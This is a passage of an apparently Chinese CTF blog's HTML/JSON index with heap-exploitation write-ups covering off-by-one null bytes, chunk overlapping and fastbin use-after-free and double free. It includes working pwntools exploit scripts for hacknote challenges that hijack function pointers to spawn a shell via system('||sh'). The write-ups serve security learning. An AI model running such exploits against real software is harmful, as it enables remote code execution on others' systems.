class=\"comment\">//id</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>申请一个name和des都是0x10大小的book，内存空间如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-04%20%E4%B8%8B%E5%8D%883.54.37.png\" alt=\"截屏2022-04-04 下午3.54.37\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( a2 &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)read(<span class=\"number\">0</span>, a1, <span class=\"number\">1uLL</span>) != <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *a1 == <span class=\"string\">&#x27;\\n&#x27;</span> )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  ++a1;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i == a2 )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">*a1 = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br></pre></td></tr></table></figure>\n<p>​        漏洞出在这个读入的函数，在读取应该结束的时候，buf却不正确地加一，同时指向区域被置0，这就造成了空字节溢出。这个读入函数虽然被用于每一个和输入有关的功能上，但是只有输入作者姓名的时候可以较为方便地利用。</p>\n<h4><span id=\"利用\">利用</span></h4><h5><span id=\"大致的思考\">大致的思考</span></h5><p>​        这道题的核心就在于溢出空字节，修改next chunk的prev inuse位，造成chunk overlapping。相较于之前那个比较简单的例子，这个例子在程序逻辑上相对更复杂，并且漏洞的利用难度增加了一些，首先就是不能溢出任意的单字节，这就为我们修改chunk size增加了步骤。</p>\n<h5><span id=\"leak-heap\">leak heap</span></h5><p>​        这里有个非常之坑的点。我们输入的作者姓名和book结构体地址正好相差32字节，所以按道理我们输入在作者姓名时输入32个字符，字符串末尾的空字节会在创建结构体时被直接覆盖为结构体的指针，因此打印book信息的时候，作者这一栏能直接把后面的指针也打印出来。</p>\n<p>​        但是，如果我们是使用pre_load加载别的版本的libc，那么，这里作者名字的地址和结构体的地址，就完全不在一个地方，根本没有办法泄露。所以在这里我们只能先摁把libc改成本机，或者找个16.04的ubuntu来做，改本机libc这种事情不是linux铁佬建议别尝试，上一个被我魔改的ubuntu已经与这个世界说再见了。</p>\n<p>​        摁打情况的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Enter author name: &quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">b&#x27;a&#x27;</span>,<span class=\"number\">32</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">printbook(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;Author:&#x27;</span>)</span><br><span class=\"line\">heap_addr = io.recv()[<span class=\"number\">32</span>:<span class=\"number\">38</span>]</span><br><span class=\"line\">heap_addr = u64(heap_addr.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr&quot;</span> + <span class=\"built_in\">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>\n<h5><span id=\"利用fake-chunk构造任意地址写\">利用fake chunk构造任意地址写</span></h5><p>​        我们已经获得了一个堆上的地址，接下来我们需要利用空字节溢出构造出任意地址写。还是利用到刚才利用过的漏洞点，再次在修改作者名字时写入32个字符，这样空字节就会溢出覆盖struct chunk ptr中第一个 chunk ptr的地址最低位。</p>\n<p>​        因为每个book，des和name相对structure是在低地址，所以当structure的ptr最低位被空字节覆盖，如果此时des chunk很大的话，那么structure就会指向des chunk的内部。</p>\n<p>​        这样chunk structure的指针已经被我们劫持了，des中也有足够的空间，我们现在只需要伪造出一个合法可利用的fake structure。在这个假的结构中，我们需要实现任意地址写的功能。我们可以在fake book1 structure的des ptr字段填写book2 des ptr字段的地址，当我们使用edit修改book1的字段时，实际上就是对book2 des ptr进行修改。我们可以将其修改为我们想要的任何地址，比如<code>free_got</code>，于是当我们edit book2的des时，就是对这个des ptr指向的地方，也就是我们刚刚修改的地址指向的地方进行修改，比如说改为<code>system_addr</code>。这就是一个很完美的任意地址任意写的实现。</p>\n<h5><span id=\"leak-libc\">leak libc</span></h5><p>​        为了完成任意地址写，我们还需要获得system的地址。这个题同样可以通过<code>mmap()</code>暴力拿到libc的基址。</p>\n<h5><span id=\"细节以及exp\">细节以及exp</span></h5><p>累了，tbc。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​    </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - Off By One"]},{"title":"chunk_overlapping 学习","url":"/2022/05/16/heap_learning_chunk_overlapping-%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-VDRigsAL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"从一个例子开始\">从一个例子开始：</span></h2><p>​        先还原一个很适合的情景，pwnable的secret of my heart这道题。</p>\n<p>​        我们有一个非常好用的空字节溢出，2.23的libc，可以申请的size最大为0x100，heap base已知，没有更多特殊的限制，现在我们需要leak libc，同时需要double free来任意地址写，我们有什么好的思路？</p>\n<p>​        首先由于我们有一个空字节溢出，所以假如有三个连续的allocated chunk，可以先free掉第一个chunk，再申请回来，溢出一个空字节到下面的堆块的size位，覆盖previnuse位</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.26.48.png\" alt=\"截屏2022-05-15 下午11.26.48\"></p>\n<p>​        例如这个情况。</p>\n<p>​        所以如果我们这时候free 1，会发生什么情况呢？不难想象，通常情况下我们free chunk1，会将这个bin放入unsorted bin中，但是由于没有uaf，所以既不能double free也不能leak。</p>\n<p>​        然而实际情况是这样的：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-16%20%E4%B8%8B%E5%8D%889.03.51.png\" alt=\"截屏2022-05-16 下午9.03.51\"></p>\n<p>​        可以看到原本的-0x20chunk和0x100chunk合并成了一个0x120的chunk，并被放入了bin中，而0x100的chunk纹丝不动。</p>\n<p>​        这就这涉及到free chunk的合并机制了。这里我们用的是向前合并。</p>\n<h2><span id=\"向前合并\">向前合并</span></h2><h3><span id=\"原理\">原理</span></h3><p>​        当free chunk时，首先根据当前chunk的prev inuse位判断前一个chunk（物理相邻）是否是free状态，如果是，则会触发unlink。prev size则用来计算上一个chunk的地址（以及大小），所以我们可以发现这里chunk是否合并，如何合并，完全可以被我们控制。</p>\n<p>​        所以在我们之前的例子中，当我们free 这个0x100chunk，此时我们构造chunk的prev size为0x20，那么0x100chunk就认定其前一个chunk也是free chunk，因此需要进行合并。</p>\n<p>​        合并的过程需要unlink将其从free list中取出，而这个过程有一定的check，首先就要求</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">chunksize(P) = prev_size (next_chunk(P))</span><br></pre></td></tr></table></figure>\n<p>​        也就是下一个chunk的prev size需要与当前chunksize相等。这里的当前chunk实际是我们正在free chunk的上一个chunk，在例子中就是chunk0，其size需要等于chunk1 prev size，也就是20。</p>\n<p>​            然而我们仅仅伪造这个是不够的。我们还需要满足</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">(FD-&gt;bk = P || BK-&gt;fd = P)</span><br></pre></td></tr></table></figure>\n<p>​        这里p就是chunk0，所以需要满足这个条件，就可以吧p的fd和bk全部设为自己，那么不管怎么指都能满足条件。</p>\n<p>​        然后进行unlink，但是由于fd 和bk都是p，所以这里虽然size会变化，但是内存分布是没有变化的。</p>\n<p>​        此外，因为向前合并了，所以chunk1被认为是freechunk，chunk2的prevsize位以及prev inuse位就会为0x120和0x70。</p>\n<p>​        此时继续申请0x68chunk，分割unsroted bin。同时由于chunk overlap，这个0x68既是原本0x20chunk0，又是合并后的chunk1.这样就形成了double free。接着就比较好搞了。</p>\n<p>​        总结一下，首先通过空字节溢出，构造unsorted bin，这个题相对来说特殊一些，然后通过堆叠以及double free构造两个重合的指针。</p>\n<h2><span id=\"向后合并\">向后合并</span></h2><p>​        刚刚我们研究了前向合并的解法，当然这道题作为一个比较经典的chunk overlapping题，也可以进行后向合并。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["HEAP - ChunkOverlapping"]},{"title":"fastbin attack","url":"/2021/12/06/heap_learning_fastbin_attack/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-cDeoBCkW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h2><span id=\"fastbin\">fastbin</span></h2><p>​    长度在<code>32-160</code>(32位系统是<code>16-80</code>)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。</p>\n<h2><span id=\"uaf\">UAF</span></h2><p>​        先从一个简单的例子开始：</p>\n<h4><span id=\"hacknote\">hacknote</span></h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote\">题目链接</a></p>\n<p>​        菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用<code>print_note</code>实则是在调用后门函数。</p>\n<p>​        然后来详细分析一下题目的逻辑。</p>\n<p>​        在<code>add_note()</code>中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：<code>printnote</code>    的指针和<code>content</code>的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。</p>\n<p>​        每个note的chunk的地址是连续的。</p>\n<p>​        我们连续申请两个note。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;aaaa&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.00.23.png\" alt=\"截屏2021-12-06 下午10.00.23\"></p>\n<p>​        可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。</p>\n<p>​        然后我们分别释放这两个chunk。</p>\n<p>（然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.13.27.png\" alt=\"截屏2021-12-06 下午10.13.27\"></p>\n<p>​        </p>\n<p>​        问题不大，pwndocker好处就体现在此。</p>\n<p>​        可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8810.15.51.png\" alt=\"截屏2021-12-06 下午10.15.51\"></p>\n<p>​        可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.10.37.png\" alt=\"截屏2021-12-06 下午11.10.37\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.12.17.png\" alt=\"截屏2021-12-06 下午11.12.17\"></p>\n<p>​            fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是<code>0x5695c038</code>和<code>0x5695c0300</code>。</p>\n<p>​        也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的<em>put和 </em>content，也就是说，如果我们此刻执行<code>print(note0)</code>,那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。</p>\n<p>​        此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-06%20%E4%B8%8B%E5%8D%8811.25.50.png\" alt=\"截屏2021-12-06 下午11.25.50\"></p>\n<p>完整exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./hacknote&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./&#x27;)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Note size :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#main_arena  0x10:=&gt; chunk1_print(0x10) </span></span><br><span class=\"line\"><span class=\"comment\">#            0x20:=&gt; chunk1_content(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#main_arena  0x10:=&gt; chunk0_print(0x10) =&gt; chunk1_print(0x10) </span></span><br><span class=\"line\"><span class=\"comment\">#            0x20: =&gt; chunk0_content(0x20)=&gt; chunk1_content(0x20)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fastbin:</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) </span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic)*<span class=\"number\">2</span>)<span class=\"comment\">#chunk2, point to chunk0_print(0x10) and chunk1_print(0x10)</span></span><br><span class=\"line\">put(<span class=\"number\">1</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"pwnable_hacknote\">pwnable_hacknote</span></h4><p>​        好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。</p>\n<p>​        <a href=\"https://pwnable.tw/challenge/#5\">题目链接</a></p>\n<p>​        源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>, <span class=\"string\">&quot;./hacknote&quot;</span>], env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span>:<span class=\"string\">&quot;/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6&quot;</span>&#125;)</span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc_32.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print_addr = <span class=\"number\">0x804862b</span></span><br><span class=\"line\">puts_got = <span class=\"number\">0x804A024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addnote</span>(<span class=\"params\">size, content</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">printnote</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;:&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">magic = <span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;yuuu&quot;</span>) <span class=\"comment\"># add note 0</span></span><br><span class=\"line\">addnote(<span class=\"number\">32</span>, <span class=\"string\">&quot;ddaa&quot;</span>) <span class=\"comment\"># add note 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">delnote(<span class=\"number\">0</span>) <span class=\"comment\"># delete note 0</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># delete note 1</span></span><br><span class=\"line\">addnote(<span class=\"number\">8</span>,p32(print_addr)+p32(puts_got))</span><br><span class=\"line\">printnote(<span class=\"number\">0</span>)</span><br><span class=\"line\">puts_addr = u32(r.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">libc_base = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>] - libc_base</span><br><span class=\"line\">delnote(<span class=\"number\">2</span>)</span><br><span class=\"line\">addnote(<span class=\"number\">8</span>,flat([system_addr,<span class=\"string\">&quot;||sh&quot;</span>]))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">printnote(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2><span id=\"fastbindoublefree\">FastbinDoubleFree</span></h2><p>​        </p>\n<p>​    关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与<code>main_arena</code>直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。</p>\n<p>​        从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为<code>main_arena</code>（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。</p>\n<p>​        高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。            </p>\n<p>​        例子来源于之前做过的一些题：</p>\n<h4><span id=\"metasequoia_2020_samsara\">metasequoia_2020_samsara</span></h4><p>​        <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/metasequoia_2020_samsara\">题目链接</a></p>\n<p>​        逻辑比较好逆，如果v8等于deadbeef就能getshell。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.28.11.png\" alt=\"截屏2021-12-07 下午10.28.11\"></p>\n<p>​        </p>\n<p>​        然后变量的栈布局是这样的</p>\n<p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.27.32.png\" alt=\"截屏2021-12-07 下午10.27.32\"></p>\n<p>​        可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写</p>\n<p>​        然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。</p>\n<p>​        那么思路大概是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">add chunk0</span><br><span class=\"line\">add chunk1</span><br><span class=\"line\">add chunk2#防止free chunk被top chunk合并</span><br><span class=\"line\"></span><br><span class=\"line\">free chunk0</span><br><span class=\"line\">free chunk1</span><br><span class=\"line\">free chunk0</span><br></pre></td></tr></table></figure>\n<p>​    此刻fastbin链表大致如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0</span><br></pre></td></tr></table></figure>\n<p>​    然后此时再</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">add chunk3 #申请到的是chunk0的内存空间</span><br><span class=\"line\">edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）</span><br><span class=\"line\">然后链表大概长这样：</span><br><span class=\"line\">main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）</span><br><span class=\"line\">所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。</span><br></pre></td></tr></table></figure>\n<p>​        然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。</p>\n<p>​        （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。）    </p>\n<p>​        （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 